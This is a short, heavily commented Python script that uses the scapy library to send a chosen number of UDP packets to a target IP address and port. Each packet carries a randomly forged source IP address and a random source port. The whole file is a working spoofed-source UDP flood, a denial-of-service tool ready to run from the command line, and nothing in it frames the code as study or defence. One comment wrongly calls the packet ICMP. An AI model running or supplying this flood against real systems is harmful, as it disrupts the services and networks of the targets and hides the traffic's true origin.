import sys  # Importing the command-line argument module
from scapy.all import *  # Importing scapy, a packet manipulation library

def randomIP():  # Function to generate random IPs
    # Obtains four random integers from 0 to 255, converts them to a string,
    # and joins them with ".". Example: "190.0.0.1"
    ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))  # Creates a string variable storing a random IP
    return ip  # Returns the randomly generated IP address

def randPort():  # Function to generate random port numbers
    x = random.randint(0, 64000)  # Generates an integer between 0 and 64000 inclusive
    return x  # Returns the randomly generated port number

# Command line arguments
dest_ip_address = sys.argv[1]  # Command line argument index 1 is the destination's IP address
dest_port = int(sys.argv[2])  # Command line argument index 2 is the destination's port number
pkt_count = int(sys.argv[3])  # Command line argument index 3 is the total number of packets

for i in range(0, pkt_count):  # For loop iterating the total packet count
    src_ip = randomIP()  # For each iteration, generates a random source IP address
    src_port = randPort()  # For each iteration, generates a random port

    packet = IP(src=str(src_ip), dst=dest_ip_address)  # Generates IP header using scapy's IP() function with source and destination IP addresses
    segment = UDP(sport=src_port, dport=dest_port)  # Creates a UDP packet object using the randomly generated source port and given destination port
    pkt = packet/segment  # Stacks the packet objects with IP header on top and the ICMP packet below it
    send(pkt)  # Sends the combined UDP packet over the network
